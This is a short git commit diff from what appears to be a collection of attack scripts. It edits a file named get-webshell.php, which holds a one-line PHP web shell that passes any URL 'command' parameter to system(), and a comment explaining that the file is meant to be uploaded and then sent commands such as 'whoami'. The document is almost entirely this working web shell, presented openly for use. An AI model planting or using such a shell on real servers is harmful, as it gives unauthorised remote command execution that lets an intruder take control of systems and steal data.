fe4b47186ab026a122dcf7b059f5b8a931f5e86b
Zayd <114421293+partyh4t@users.noreply.github.com>
2024-01-05 20:55:26 -0500

    Update get-webshell.php

--- Scripts/PHP One Liners/get-webshell.php
+++ Scripts/PHP One Liners/get-webshell.php
@@ -2,5 +2,5 @@
 
 <?php echo system($_GET['command']); ?>
 
-<!-- Once uploaded, use this to pass commands: GET /example/exploit.php?command=whoami HTTP/1.1 -->
+// Once uploaded, use this to pass commands: GET /example/get-webshell.php?command=whoami HTTP/1.1
 
